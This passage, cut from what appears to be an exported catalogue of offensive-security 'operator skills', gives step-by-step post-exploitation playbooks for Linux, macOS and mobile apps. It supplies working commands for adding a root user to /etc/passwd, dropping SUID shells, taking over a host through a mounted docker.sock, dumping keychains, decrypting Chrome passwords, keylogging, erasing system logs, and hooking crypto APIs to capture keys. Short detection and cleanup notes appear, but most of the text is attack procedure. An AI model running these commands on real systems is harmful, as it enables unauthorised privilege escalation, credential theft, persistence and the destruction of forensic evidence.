ad <code>/etc/shadow</code> or root SSH keys</td></tr><tr><td>Writable <code>/etc/passwd</code></td><td>append a root-uid user with a known crypt hash: <code>openssl passwd -1 pass</code> → <code>hacker:$1$...:0:0::/root:/bin/bash</code></td></tr><tr><td>Cron/timer hijack</td><td>write to a world-writable script a root cron job or systemd timer executes; wait for the next fire</td></tr><tr><td>NFS <code>no_root_squash</code></td><td><code>showmount -e &lt;host&gt;</code> → mount an exported share → drop a root-owned SUID shell binary onto it from the client</td></tr></tbody></table></div><h4 class=\"mh\">Phase 3 — Credential and key theft</h4><div class=\"tw\"><table><thead><tr><th>Source</th><th>Command</th></tr></thead><tbody><tr><td>SSH private keys</td><td><code>find / -name 'id_*' -path '*/.ssh/*' 2&gt;/dev/null; find /home -name authorized_keys 2&gt;/dev/null</code></td></tr><tr><td>SSH agent hijack</td><td>with access to another user's <code>SSH_AUTH_SOCK</code> under <code>/tmp</code>, <code>SSH_AUTH_SOCK=&lt;sock&gt; ssh-add -l</code> then reuse their forwarded keys</td></tr><tr><td>Shadow hashes</td><td><code>cp /etc/shadow</code> (if readable/root) → <code>hashcat -m 1800</code> offline</td></tr><tr><td>History and configs</td><td>`cat ~/.bash_history ~/.*_history; grep -rIED 'password</td><td>token</td><td>secret</td><td>api[_-]?key' /home /var/www /opt 2&gt;/dev/null`</td></tr><tr><td>Cloud and app creds</td><td><code>~/.aws/credentials</code>, <code>~/.config/gcloud</code>, <code>~/.kube/config</code>, <code>.env</code>, <code>.git-credentials</code></td></tr></tbody></table></div><h4 class=\"mh\">Phase 4 — Persistence</h4><div class=\"tw\"><table><thead><tr><th>Mechanism</th><th>Method</th></tr></thead><tbody><tr><td>Authorized key</td><td>append your public key to <code>~/.ssh/authorized_keys</code> for a live user</td></tr><tr><td>Cron</td><td>a per-user <code>crontab -e</code> entry or a file in <code>/etc/cron.d</code> calling back</td></tr><tr><td>systemd</td><td>a user or system <code>.service</code> plus a <code>.timer</code>, or <code>systemd --user</code> unit that survives logout with lingering enabled</td></tr><tr><td>SUID drop</td><td>as root, <code>cp /bin/bash /tmp/.b &amp;&amp; chmod 4755 /tmp/.b</code> for a fast re-escalation (loud; remove on exit)</td></tr></tbody></table></div><h4 class=\"mh\">Phase 5 — Container escape triage</h4><p>When <code>/.dockerenv</code> or cgroup markers show you are in a container, check the escapes ordinary access reaches:</p><pre class=\"code\" data-lang=bash><code>capsh --print 2&gt;/dev/null                 # CAP_SYS_ADMIN → many escapes\nls -la /var/run/docker.sock 2&gt;/dev/null   # mounted socket → create a privileged host container\nmount | grep -E 'hostpath|/host'          # host filesystem mounted in\ncat /proc/1/cgroup                        # cgroup path leaks host layout</code></pre><p>A mounted <code>docker.sock</code> is a host takeover: <code>docker run -v /:/host --privileged ...</code>. A privileged container or <code>CAP_SYS_ADMIN</code> opens the classic <code>release_agent</code>/cgroup and core-pattern escapes.</p><h4 class=\"mh\">Phase 6 — Cleanup (MANDATORY)</h4><p>Remove every artefact before leaving: dropped SUID binaries, added users in <code>/etc/passwd</code>, cron/timer entries, authorized-key lines, and staged tools. Truncate the shell history you generated (<code>history -c</code>; remove entries from <code>~/.bash_history</code>) and note in the journal what was left if anything could not be reversed.</p>","n":4346},{"t":"Boundary","h":"<p><code>linux-postexploit</code> owns what <strong>ordinary userland access</strong> reaches — SUID/sudo/capability escalation, cron and systemd persistence, credential and key theft, and container-escape triage. <code>ebpf-attacks</code> owns anything that needs <code>CAP_BPF</code>/<code>CAP_SYS_ADMIN</code> and a <strong>loaded BPF program</strong>: kernel instrumentation, syscall-level hiding, and the blind-spot monitors. If the technique requires attaching a BPF program to the kernel, it is <code>ebpf-attacks</code>; if it works from a normal shell and standard binaries, it is here.</p>","n":511},{"t":"Detection considerations","h":"<ul class=\"ml\"><li><code>auditd</code> records <code>execve</code>, <code>setuid</code>, and writes to <code>/etc/passwd</code> and <code>/etc/shadow</code>.</li><li>SSH key additions and new cron/systemd units are high-signal for host EDR and file-integrity monitoring.</li><li>A dropped SUID binary is trivially found by the same <code>find / -perm -4000</code> you ran — assume the defender runs it too.</li><li>Kernel-exploit attempts often leave <code>dmesg</code> traces and can panic the host; triage the version-to-exploit mapping (<code>uname -r</code>, distro backport status) before firing anything.</li></ul>","n":487}],"m":{"name":17,"desc":400,"body":6265,"file":6762,"dband":"optimal","bband":"optimal","ceil":{"desc":{"lim":1024,"pct":39.1},"name":{"lim":64,"pct":26.6}}}},"macos-postexploit":{"slug":"macos-postexploit","pillar":"operators","name":"macos-postexploit","description":"Work a macOS host — unlock and dump the keychain, harvest browser and SSH material, trace live processes with DTrace where SIP permits, reach data behind TCC and Gatekeeper, and strip launchd persistence and unified-log traces before leaving. Reach for it once user or root access is held on a Mac.","family":"host-postexploit","ported":true,"source":".cyberstrike/skill/macos-postexploit/SKILL.md","summary":"macOS post-exploitation uses native tools (`security`, `dtrace`, `xattr`, `log`), Python with PyObjC/Quartz frameworks, and direct SQLite access for credential extraction. After gaining root or user-level access on a macOS target, these tools provide credential harvesting, runtime monitoring, and operational security capabilities.","file":"acordia-operators/skills/macos-postexploit/SKILL.md","used_by":["internal-network"],"intro":"<p># macOS Post-Exploitation Methodology</p><p>macOS post-exploitation uses native tools (<code>security</code>, <code>dtrace</code>, <code>xattr</code>, <code>log</code>), Python with PyObjC/Quartz frameworks, and direct SQLite access for credential extraction. After gaining root or user-level access on a macOS target, these tools provide credential harvesting, runtime monitoring, and operational security capabilities.</p>","secs":[{"t":"Prerequisites","h":"<p>Before beginning macOS post-exploitation, verify:</p><ol class=\"ml\"><li><strong>Root access</strong> — most operations require root (except <code>xprotect_check</code>, <code>gatekeeper_bypass</code> for user-owned files, <code>ssh_keys</code> for current user)</li><li><strong>SIP status</strong> — DTrace tools require SIP disabled (<code>csrutil disable</code> from Recovery Mode)</li><li><strong>Python3</strong> — available via Xcode CLT or Homebrew</li><li><strong>PyObjC</strong> — required for <code>keylog_mac</code> (CGEventTap); install via <code>pip3 install pyobjc-framework-Quartz</code></li></ol><pre class=\"code\" data-lang=bash><code># Quick prerequisite check\ncsrutil status                           # SIP status (DTrace needs disabled)\nsw_vers                                  # macOS version\nsecurity list-keychains                  # available keychains\npython3 -c &quot;import Quartz; print('OK')&quot;  # PyObjC for keylogging\nls /Library/Apple/System/Library/CoreServices/XProtect.bundle  # XProtect present</code></pre>","n":835},{"t":"Kill Chain Phases","h":"<h4 class=\"mh\">Phase 1 — Situational Awareness (First 60 seconds)</h4><p>Understand the defensive landscape before deploying hooks.</p><div class=\"tw\"><table><thead><tr><th>Action</th><th>Command</th><th>Purpose</th></tr></thead><tbody><tr><td>Check XProtect</td><td><code>system_profiler SPInstallHistoryDataType, check /Library/Apple/System/Library/CoreServices/XProtect.bundle</code></td><td>Enumerate XProtect/MRT signatures to know what triggers detection</td></tr><tr><td>Check SIP</td><td><code>csrutil status</code></td><td>Determine if DTrace monitoring is available</td></tr><tr><td>SSH keys</td><td><code>find /Users -name 'id_*' -path '*/.ssh/*' 2&gt;/dev/null</code></td><td>Find SSH private keys — often leads to lateral movement</td></tr><tr><td>Keychain list</td><td><code>security list-keychains</code></td><td>See available keychains before dumping</td></tr></tbody></table></div><h4 class=\"mh\">Phase 2 — Credential Harvesting</h4><p>Extract credentials from macOS-specific stores.</p><div class=\"tw\"><table><thead><tr><th>Action</th><th>Command</th><th>Purpose</th></tr></thead><tbody><tr><td>Keychain dump</td><td><code>security dump-keychain -d login.keychain (prompts per item without root; root extracts silently)</code></td><td>Extract all passwords from login/system Keychain via <code>security</code> command</td></tr><tr><td>Browser creds</td><td><code>sqlite3 ~/Library/Application\\ Support/Google/Chrome/Default/Login\\ Data + AES key from Keychain</code></td><td>Extract Chrome/Safari saved passwords and cookies with AES decryption</td></tr><tr><td>SSH keys</td><td><code>find /Users -name 'id_*' -path '*/.ssh/*' 2&gt;/dev/null</code></td><td>Find private keys for all users — id_rsa, id_ed25519, etc.</td></tr><tr><td>TCC bypass</td><td><code>inject into a TCC-approved process or abuse an entitled helper (CVE-dependent)</code></td><td>Bypass TCC to access camera, microphone, files without user consent</td></tr><tr><td>Keystroke capture</td><td><code>CGEventTapCreate(kCGHIDEventTap) with NSWorkspace.activeApplication context</code></td><td>Log keystrokes via CGEventTap with application context</td></tr></tbody></table></div><p><strong>Keychain extraction</strong> uses the macOS <code>security</code> command to enumerate and dump keychain items. Root access allows dumping without per-item authorization prompts. The login keychain contains WiFi passwords, website credentials, certificates, and application tokens.</p><p><strong>Chrome credential extraction</strong> copies the locked Login Data SQLite database, retrieves the Safe Storage key from Keychain, derives the AES decryption key via PBKDF2, and decrypts each stored password. Safari passwords are stored in Keychain and extracted via <code>security find-internet-password</code>.</p><p><strong>TCC bypass</strong> targets the TCC.db database (<code>~/Library/Application Support/com.apple.TCC/TCC.db</code>) to grant access to protected resources without user consent dialogs.</p><h4 class=\"mh\">Phase 3 — Monitoring (SIP disabled required)</h4><p>DTrace provides kernel-level visibility into the target system.</p><div class=\"tw\"><table><thead><tr><th>Action</th><th>Command</th><th>Purpose</th></tr></thead><tbody><tr><td>Process monitoring</td><td><code>dtrace -n 'proc:::exec-success { trace(curpsinfo-&gt;pr_psargs); }' (requires SIP disabled)</code></td><td>Trace all process executions — detect cron, security scans, admin activity</td></tr><tr><td>Network monitoring</td><td><code>dtrace -n 'ip:::send { trace(args[2]-&gt;ip_daddr); }' (requires SIP disabled)</code></td><td>Monitor all network connections — identify internal services, C2</td></tr><tr><td>File monitoring</td><td><code>dtrace -n 'syscall::open*:entry { trace(copyinstr(arg0)); }' (requires SIP disabled)</code></td><td>Monitor file access — detect what admin tools read/write</td></tr></tbody></table></div><h4 class=\"mh\">Phase 4 — Stealth</h4><p>Reduce the forensic footprint.</p><div class=\"tw\"><table><thead><tr><th>Action</th><th>Command</th><th>Purpose</th></tr></thead><tbody><tr><td>Gatekeeper bypass</td><td><code>xattr -d com.apple.quarantine /path</code></td><td>Remove quarantine xattr to allow unsigned tool execution</td></tr><tr><td>Clear logs</td><td><code>log erase --all &amp;&amp; rm -rf /var/log/asl/*.asl /var/audit/* ~/Library/Logs/CrashReporter/*</code></td><td>Clear unified logging, ASL, audit logs, crash reports, shell history</td></tr></tbody></table></div><h4 class=\"mh\">Phase 5 — Cleanup (MANDATORY)</h4><p>Always run cleanup before exiting a target.</p><pre class=\"code\"><code>launchctl unload matching LaunchAgents/Daemons, kill DTrace processes, remove temp files, clear shell history</code></pre><p>The cleanup tool:</p><ol class=\"ml\"><li>Finds and removes LaunchAgents/LaunchDaemons matching operator-deployed patterns</li><li>Kills any running DTrace or monitoring processes started during this phase</li><li>Removes temporary files and copied databases</li><li>Clears operation-specific entries from shell history</li></ol>","n":4005},{"t":"Detection Considerations","h":"<p>macOS post-exploitation tools are detectable by:</p><ul class=\"ml\"><li><strong>Endpoint Security Framework (ESF)</strong> — EDR agents using <code>es_new_client()</code> for process/file/auth events</li><li><strong>Unified Logging</strong> — <code>log show --predicate 'process == &quot;security&quot;'</code> for Keychain access</li><li><strong>TCC audit</strong> — TCC access logged in Console.app, <code>tccutil</code> events visible</li><li><strong>SIP</strong> — When enabled, blocks DTrace system-wide tracing and TCC.db modification</li><li><strong>XProtect</strong> — Scans downloaded executables against YARA rules</li><li><strong>Gatekeeper</strong> — Checks code signing and quarantine attributes</li><li><strong>CrowdStrike Falcon / Jamf Protect</strong> — macOS-specific EDR detects suspicious <code>security</code> command usage and CGEventTap creation</li></ul>","n":665},{"t":"Program Reference","h":"<div class=\"tw\"><table><thead><tr><th>Program</th><th>Technique</th><th>MITRE ATT&amp;CK</th></tr></thead><tbody><tr><td>keychain_dump</td><td>macOS Keychain extraction via security CLI</td><td>T1555.001 — Keychain</td></tr><tr><td>chrome_creds</td><td>Browser credential decryption (Chrome/Safari)</td><td>T1555.003 — Credentials from Web Browsers</td></tr><tr><td>ssh_keys</td><td>SSH private key discovery and exfiltration</td><td>T1552.004 — Private Keys</td></tr><tr><td>tcc_bypass</td><td>TCC database manipulation for resource access</td><td>T1548 — Abuse Elevation Control Mechanism</td></tr><tr><td>keylog_mac</td><td>Keystroke capture via CGEventTap</td><td>T1056.001 — Keylogging</td></tr><tr><td>dtrace_exec</td><td>Process execution tracing via DTrace</td><td>T1057 — Process Discovery</td></tr><tr><td>dtrace_net</td><td>Network connection tracing via DTrace</td><td>T1049 — System Network Connections Discovery</td></tr><tr><td>dtrace_file</td><td>File access tracing via DTrace</td><td>T1083 — File and Directory Discovery</td></tr><tr><td>xprotect_check</td><td>XProtect/MRT signature enumeration</td><td>T1518.001 — Security Software Discovery</td></tr><tr><td>gatekeeper_bypass</td><td>Quarantine xattr removal</td><td>T1553.001 — Gatekeeper Bypass</td></tr><tr><td>log_clear</td><td>Unified log, ASL, and audit log clearing</td><td>T1070.002 — Clear Linux or Mac System Logs</td></tr><tr><td>cleanup_mac</td><td>Artifact removal and process cleanup</td><td>T1070 — Indicator Removal</td></tr></tbody></table></div>","n":1177}],"m":{"name":17,"desc":298,"body":7153,"file":7643,"dband":"optimal","bband":"optimal","ceil":{"desc":{"lim":1024,"pct":29.1},"name":{"lim":64,"pct":26.6}}}},"mobile-crypto-keys":{"slug":"mobile-crypto-keys","pillar":"operators","name":"mobile-crypto-keys","description":"Judge a mobile app's cryptography and recover its key material — weak primitives and modes in decompiled code, hardcoded and predictably derived keys, Keystore and Keychain protection classes, and live key capture by hooking Cipher and CommonCrypto. Reach for it once ciphertext or a protected blob is in hand and the question is which algorithm produced it and where the key lives.","family":"mobile","ported":false,"source":null,"summary":"Client-side cryptography in a mobile app is only as strong as the key the client holds, and the client holds every key it uses. This skill answers two questions about any encrypted value on the device: was a sound algorithm used, and can the key be recovered — statically from the binary, or at runtime by hooking the moment the key reaches the crypto API.","file":"acordia-operators/skills/mobile-crypto-keys/SKILL.md","used_by":["mobile-application"],"intro":"<p># Mobile Cryptography and Key Material</p><p>Client-side cryptography in a mobile app is only as strong as the key the client holds, and the client holds every key it uses. This skill answers two questions about any encrypted value on the device: was a sound algorithm used, and can the key be recovered — statically from the binary, or at runtime by hooking the moment the key reaches the crypto API.</p>","secs":[{"t":"Prerequisites","h":"<ul class=\"ml\"><li>Decompiled source for static review — see <code>mobile-instrumentation</code> for <code>jadx</code> and <code>apktool</code></li><li>A running instance with Frida attached for the runtime path: <code>objection -g &lt;pkg-or-bundle-id&gt; explore</code></li></ul>","n":198},{"t":"Static review of the decompiled code","h":"<p>Search the decompiled tree for primitives that fail outright and for key material committed into it.</p><pre class=\"code\" data-lang=bash><code>grep -rn &quot;password\\|secret\\|api_key\\|token&quot; jadx-output/ --include=&quot;*.java&quot;\ngrep -rniE &quot;AES/ECB|DES|3DES|RC4|MD5|SHA1\\b&quot; jadx-output/ --include=&quot;*.java&quot;\ngrep -rn &quot;SecretKeySpec\\|IvParameterSpec\\|PBEKeySpec\\|SecureRandom\\|setSeed&quot; jadx-output/ --include=&quot;*.java&quot;</code></pre><p>What each hit means:</p><div class=\"tw\"><table><thead><tr><th>Finding</th><th>Why it fails</th></tr></thead><tbody><tr><td><code>Cipher.getInstance(&quot;AES/ECB/...&quot;)</code></td><td>ECB leaks plaintext structure; identical blocks encrypt identically</td></tr><tr><td><code>DES</code>, <code>3DES</code>, <code>RC4</code></td><td>Broken or deprecated primitives</td></tr><tr><td><code>MD5</code>, <code>SHA-1</code> for integrity or password hashing</td><td>Collision-prone; unsuitable as a password KDF at any iteration count</td></tr><tr><td><code>new SecretKeySpec(&quot;literal&quot;.getBytes(), &quot;AES&quot;)</code></td><td>Hardcoded key — the whole scheme is decorative</td></tr><tr><td>A fixed <code>IvParameterSpec</code>, or an IV derived from the key</td><td>Reused IV destroys CBC/GCM security</td></tr><tr><td><code>SecureRandom.setSeed(&lt;constant&gt;)</code></td><td>Deterministic &quot;random&quot; key or IV</td></tr><tr><td><code>PBEKeySpec</code> with a low iteration count or a constant salt</td><td>Key derivable by offline brute force</td></tr></tbody></table></div><p>On iOS, review the CommonCrypto call sites — <code>CCCrypt</code>, <code>CCCryptorCreate</code>, <code>kCCAlgorithmDES</code>, <code>kCCOptionECBMode</code> — and the SecItem attributes used when storing keys.</p>","n":1289},{"t":"Key storage: does the platform actually protect it","h":"<ul class=\"ml\"><li>Whether each Android Keystore alias is hardware-backed, which is the question that decides the finding: <code>objection</code> → <code>android keystore detail --json</code>. A software-backed key in a rooted-device threat model protects nothing. Listing the aliases in the first place is <code>mobile-data-storage</code>.</li><li>Watch the app use the Keystore live, which shows which alias serves which operation: <code>objection</code> → <code>android keystore watch</code></li><li>iOS Keychain accessibility class per item — <code>kSecAttrAccessibleAlways</code> and <code>...AfterFirstUnlock</code> survive a locked device, <code>...WhenUnlockedThisDeviceOnly</code> is the defensible choice: <code>objection</code> → <code>ios keychain dump</code></li><li>A key material blob living in <code>shared_prefs/</code> or a plist rather than the platform store is a storage finding as well; record it in both places and see <code>mobile-data-storage</code> for retrieval</li></ul>","n":821},{"t":"Runtime key capture","h":"<p>Hooking beats reversing. The key is a plain byte array at the moment it enters the crypto API, whatever obfuscation produced it.</p><ul class=\"ml\"><li>Load a purpose-written hook against a spawned process: <code>frida -U -f &lt;pkg&gt; -l crypto-hook.js</code></li><li>Watch Android crypto entry points with arguments and returns dumped, no script needed:</li><ul class=\"sub\"><li><code>objection</code> → <code>android hooking watch class_method javax.crypto.spec.SecretKeySpec.$init --dump-args --dump-backtrace</code></li><li><code>objection</code> → <code>android hooking watch class_method javax.crypto.Cipher.doFinal --dump-args --dump-return</code></li><li><code>objection</code> → <code>android hooking watch class_method java.security.MessageDigest.digest --dump-args --dump-return</code></li></ul><li>Find the app's own crypto wrapper before hooking blind: <code>objection</code> → <code>android hooking search methods encrypt</code>, and <code>android hooking list class_methods &lt;class&gt;</code></li><li>iOS CommonCrypto, monitored wholesale: <code>objection</code> → <code>ios monitor crypto</code></li><li>Force the interpreter when hooks fail to land against optimised code: <code>objection</code> → <code>android deoptimize</code></li><li>Recover a key that never touches a hooked API by searching process memory: <code>objection</code> → <code>memory dump all &lt;file&gt;</code>, then <code>memory search &quot;&lt;known-plaintext-or-prefix&gt;&quot; --string</code></li></ul><p>Where a boolean integrity or signature check gates the crypto path, <code>android hooking set return_value</code> flips it; that is bypass work and belongs to <code>mobile-resilience-bypass</code>.</p>","n":1360},{"t":"Evidence","h":"<p>A crypto finding is the recovered key or the decrypted plaintext, with the hook output or code reference that produced it, plus the ciphertext it opens. &quot;Uses ECB&quot; alone is a code-quality observation; pair it with a decrypted value to make it a finding.</p>","n":253},{"t":"Boundary","h":"<p>This skill owns how data was encrypted and where the key came from. What is written to disk, and how it is pulled, is <code>mobile-data-storage</code>. The Frida, objection and jadx mechanics behind every command above are <code>mobile-instrumentation</code>. Detection or anti-debug that stops you attaching is <code>mobile-resilience-bypass</code>. Transport cryptography — TLS configuration and certificate pinning — is not here; nor are token contents, which are <code>attack-jwt</code>.</p>","n":447}],"m":{"name":18,"desc":382,"body":4941,"file":5411,"dband":"optimal","bband":"optimal","ceil":{"desc":{"lim":1024,"pct":37.3},"name":{"lim":64,"pct":28.1}}}},"mobile-data-storage":{"slug":"mobile-data-storage","pillar":"operators","name":"mobile-data-storage","description":"Recover what a mobile app has written into its own sandbox — SharedPreferences and plists, SQLite databases, cached and backed-up files, log spill, clipboard and screenshot residue — on Android and iOS. Reach for it once you can read or pull the app container and the question is which sensitive data persists unprotected on disk.","family":"mobile","ported":false,"source":null,"summary":"Mobile apps leak more through what they leave behind than through what they transmit. Every credential, token, PII record or business secret an app holds ends up somewhere in its sandbox: a preferences file, a SQLite database, a cache directory, a log line, the clipboard, or a screenshot the OS took when the app went to background. This skill enumerates those locations, pulls their contents, and judges whether the storage protection claimed by the app actually holds.","file":"acordia-operators/skills/mobile-data-storage/SKILL.md","used_by":["mobile-application"],"intro":"<p># Mobile Data Storage</p><p>Mobile apps leak more through what they leave behind than through what they transmit. Every credential, token, PII record or business secret an app holds ends up somewhere in its sandbox: a preferences file, a SQLite database, a cache directory, a log line, the clipboard, or a screenshot the OS took when the app went to background. This skill enumerates those locations, pulls their contents, and judges whether the storage protection claimed by the app actually holds.</p>","secs":[{"t":"Prerequisites","h":"<ul class=\"ml\"><li>A rooted Android device / emulator, or a debuggable build, or <code>run-as</code> on a debuggable package</li><li>A jailbroken iOS device, or an app container reachable through Frida Gadget</li><li><code>objection</code> attached to the target: <code>objection -g &lt;pkg-or-bundle-id&gt; explore</code></li></ul>","n":254},{"t":"Locating the sandbox","h":"<div class=\"tw\"><table><thead><tr><th>Platform</th><th>Location</th><th>How to reach it</th></tr></thead><tbody><tr><td>Android</td><td><code>/data/data/&lt;pkg&gt;/</code> — <code>shared_prefs/</code>, <code>databases/</code>, <code>files/</code>, <code>cache/</code>, <code>no_backup/</code></td><td><code>adb shell run-as &lt;pkg&gt; ls -la /data/data/&lt;pkg&gt;/</code> on a debuggable build; <code>adb pull /data/data/&lt;pkg&gt;/databases/</code> with root</td></tr><tr><td>Android</td><td>External storage — world-readable historically, still weakly scoped</td><td><code>adb shell ls -la /sdcard/Android/data/&lt;pkg&gt;/</code></td></tr><tr><td>iOS</td><td>Data container — <code>Documents/</code>, <code>Library/Preferences/&lt;bundle-id&gt;.plist</code>, <code>Library/Caches/</code>, <code>tmp/</code></td><td><code>objection</code> → <code>env</code> prints every container path, then <code>ls</code> and <code>cd</code></td></tr><tr><td>Both</td><td>Whatever the app actually opened</td><td><code>objection</code> → <code>env</code>, then walk it rather than trusting the documented layout</td></tr></tbody></table></div>","n":739},{"t":"Preferences and key–value stores","h":"<ul class=\"ml\"><li>Android SharedPreferences: <code>adb pull /data/data/&lt;pkg&gt;/shared_prefs/</code> — plain XML, frequently holding session tokens and &quot;encrypted&quot; values that are base64</li><li>Android Keystore entries — aliases, and whether each is hardware-backed: <code>objection</code> → <code>android keystore list</code>, then <code>android keystore detail --json</code></li><li>iOS NSUserDefaults: <code>objection</code> → <code>ios nsuserdefaults get</code></li><li>iOS Keychain, the whole entitlement group with its accessibility attributes: <code>objection</code> → <code>ios keychain dump</code>, and <code>ios keychain dump_raw</code> when the processed view drops fields</li><li>iOS URL credential store and shared cookies: <code>objection</code> → <code>ios nsurlcredentialstorage dump</code>, <code>ios cookies get</code></li><li>iOS plists anywhere in the container: <code>objection</code> → <code>ios plist cat &lt;path&gt;</code></li></ul><p>A Keystore alias or a Keychain item proves only that a key exists. Whether the key protects anything is <code>mobile-crypto-keys</code>.</p>","n":866},{"t":"Databases and files","h":"<ul class=\"ml\"><li>Pull databases wholesale: <code>adb pull /data/data/&lt;pkg&gt;/databases/</code></li><li>Query in place without pulling: <code>objection</code> → <code>sqlite connect &lt;path&gt;</code> , then ordinary SQL</li><li>Retrieve a single artefact: <code>objection</code> → <code>filesystem download &lt;remote-path&gt; &lt;local-path&gt;</code>, or <code>filesystem download --folder &lt;dir&gt; &lt;local-dir&gt;</code></li><li>Read a file inline: <code>objection</code> → <code>filesystem cat &lt;path&gt;</code></li><li>Check <code>android:allowBackup</code> in the decoded manifest — when true, the sandbox is extractable without root</li><li>Realm, LevelDB and Core Data stores sit in <code>files/</code> or <code>Library/Application Support/</code>; treat any unrecognised binary in the container as a store until proven otherwise</li></ul>","n":641},{"t":"Runtime spill","h":"<ul class=\"ml\"><li>Log spill during a sensitive operation: <code>adb logcat | grep &lt;pkg&gt;</code>, or scope by PID with <code>adb logcat --pid=$(adb shell pidof -s &lt;pkg&gt;)</code></li><li>Clipboard: <code>objection</code> → <code>android clipboard monitor</code> / <code>ios pasteboard monitor</code>, then drive the copy path in the app</li><li>Backgrounding screenshots — the OS snapshots the current view unless the app blocks it. Check with <code>objection</code> → <code>android ui FLAG_SECURE true</code> to confirm the flag is <em>not</em> already set, and <code>android ui screenshot</code> / <code>ios ui screenshot</code> to capture what would be written</li><li>Whole-process memory, where a decrypted record often outlives its file: <code>objection</code> → <code>memory dump all &lt;file&gt;</code>, then <code>memory search &quot;&lt;pattern&gt;&quot; --string</code></li></ul>","n":681},{"t":"Evidence","h":"<p>Every storage finding needs the artefact itself: the pulled file or database row, the path it came from, the build and platform version, and the app action that produced it. A preference key named <code>auth_token</code> is not a finding; the token value, its path and the request it authenticates is.</p>","n":290},{"t":"Boundary","h":"<p>This skill owns what is written to disk and how it is retrieved. How that data was encrypted, and where the key came from, is <code>mobile-crypto-keys</code>. The tooling that gets you attached, decompiled or hooked in the first place is <code>mobile-instrumentation</code>. Data reachable by another app through a content provider or deep link is <code>mobile-platform-ipc</code>. If detection or anti-debug prevents you from attaching at all, clear that first with <code>mobile-resilience-bypass</code>. Data in flight to the backend is the network and API surface, covered by the <code>wstg-*</code> bundles and <code>attack-idor-automation</code>.</p>","n":585}],"m":{"name":19,"desc":330,"body":4713,"file":5132,"dband":"optimal","bband":"optimal","ceil":{"desc":{"lim":1024,"pct":32.2},"name":{"lim":64,"pct":29.7}}}},"mobile-instrumentation":{"slug":"mobile-instrumentation","pillar":"operators","name":"mobile-instrumentation","description":"Operate the mobile testing toolchain itself — adb, frida, objection, drozer, jadx, apktool, MobSF and the iOS binary tools — to decompile a package, spawn or attach to a process, enumerate and hook classes, walk the heap and dump memory. Reach for it for the mechanics of getting a decompile or a hook in place; the sibling mobile-* skills say what to look for once you have one.","family":"mobile","ported":false,"source":null,"summary":"Every other mobile technique assumes you already have a decompiled tree or a live hook. This skill is how you get them: obtaining the package, decompiling it, attaching to the running process, and using the runtime primitives — class enumeration, method watching, heap search, memory dump — that the storage, crypto, IPC and resilience skills each build on.","file":"acordia-operators/skills/mobile-instrumentation/SKILL.md","used_by":["mobile-application"],"intro":"<p># Mobile Instrumentation</p><p>Every other mobile technique assumes you already have a decompiled tree or a live hook. This skill is how you get them: obtaining the package, decompiling it, attaching to the running process, and using the runtime primitives — class enumeration, method watching, heap search, memory dump — that the storage, crypto, IPC and resilience skills each build on.</p>","secs":[{"t":"Tools","h":"<div class=\"tw\"><table><thead><tr><th>Tool</th><th>Purpose</th></tr></thead><tbody><tr><td>adb</td><td>Android Debug Bridge — device shell, file transfer, package management, logs</td></tr><tr><td>apktool</td><td>APK decode to smali and resources, and rebuild</td></tr><tr><td>jadx</td><td>DEX → Java decompiler, CLI and GUI</td></tr><tr><td>frida</td><td>Dynamic instrumentation and hooking, Android and iOS</td></tr><tr><td>objection</td><td>Runtime mobile exploration built on Frida, no script required</td></tr><tr><td>drozer</td><td>Android IPC and component security testing</td></tr><tr><td>mitmproxy / Burp</td><td>Traffic interception and manipulation</td></tr><tr><td>MobSF</td><td>Automated static and dynamic analysis, first-pass triage</td></tr><tr><td>class-dump / jtool2</td><td>iOS binary and Objective-C class analysis</td></tr></tbody></table></div>","n":628},{"t":"Obtaining the package","h":"<pre class=\"code\" data-lang=bash><code>adb shell pm list packages -3                    # third-party packages only\nadb shell pm path &lt;pkg&gt;                          # APK paths, split APKs included\nadb pull /data/app/&lt;...&gt;/base.apk                # retrieve it\nadb install -r app.apk                           # install or reinstall</code></pre><p>On iOS, pull the decrypted binary from a jailbroken device with a dump tool rather than the App Store IPA, which is FairPlay-encrypted and will not disassemble.</p>","n":467},{"t":"Static: decompiling","h":"<pre class=\"code\" data-lang=bash><code>apktool d app.apk -o output/                     # smali + decoded AndroidManifest.xml and resources\njadx -d jadx-output app.apk                      # Java source\njadx --deobf -d jadx-output app.apk              # rename obfuscated identifiers deterministically\njadx-gui app.apk                                 # interactive, for following call graphs</code></pre><p>Read <code>output/AndroidManifest.xml</code> first — it names the package, the <code>targetSdkVersion</code>, every exported component, <code>android:debuggable</code>, <code>android:allowBackup</code> and <code>android:networkSecurityConfig</code>. MobSF over the same APK gives a fast triage list, but treat its output as leads to confirm, never as findings.</p><p>On iOS, <code>class-dump</code> over the decrypted binary reconstructs the Objective-C class interfaces, and <code>jtool2</code> reads the load commands, entitlements and encryption info.</p>","n":838},{"t":"Dynamic: attaching","h":"<pre class=\"code\" data-lang=bash><code>frida-ps -U                                      # processes on the USB device\nfrida-ps -Ua                                     # running applications, with identifiers\nfrida -U -f &lt;pkg&gt; -l script.js                   # spawn, inject at start, and hold\nfrida -U -n &lt;process&gt; -l script.js               # attach to a process already running\nfrida-trace -U -i &quot;open&quot; -f &lt;pkg&gt;                # auto-generate stubs for matching native functions</code></pre><p>Spawning with <code>-f</code> matters whenever the interesting code runs before you could attach — startup checks, key derivation, first network call.</p><p>Objection wraps the same engine with a REPL:</p><pre class=\"code\" data-lang=bash><code>objection -g &lt;pkg-or-bundle-id&gt; explore\nobjection -g &lt;pkg&gt; explore --startup-command &quot;&lt;command to run before the app initialises&gt;&quot;</code></pre><p>Inside the REPL, <code>env</code> prints the app's paths, <code>ls</code>/<code>cd</code>/<code>pwd</code> walk the sandbox, <code>frida</code> reports the agent state, <code>jobs list</code> and <code>jobs kill &lt;id&gt;</code> manage running hooks, and <code>import &lt;path&gt;</code> loads a Frida script alongside them.</p>","n":1010},{"t":"Runtime primitives","h":"<p>Enumeration and hooking, Android:</p><ul class=\"ml\"><li><code>android hooking list classes</code> — every loaded class; <code>android hooking list class_methods &lt;class&gt;</code> for its methods</li><li><code>android hooking search classes &lt;pattern&gt;</code> / <code>android hooking search methods &lt;pattern&gt;</code> — locate code by name</li><li><code>android hooking get current_activity</code> — where the UI actually is</li><li><code>android hooking watch class_method &lt;class&gt;.&lt;method&gt; --dump-args --dump-backtrace --dump-return</code> — the workhorse: arguments, caller and return for every invocation</li><li><code>android hooking set return_value &lt;class&gt;.&lt;method&gt; false</code> — boolean overrides</li><li><code>android hooking notify &lt;class&gt; --watch</code> — act the moment a lazily-loaded class appears</li><li><code>android hooking generate simple &lt;class&gt;</code> — emit a Frida script skeleton to extend by hand</li><li><code>android deoptimize</code> — force interpretation when hooks will not bind</li><li><code>android shell_exec 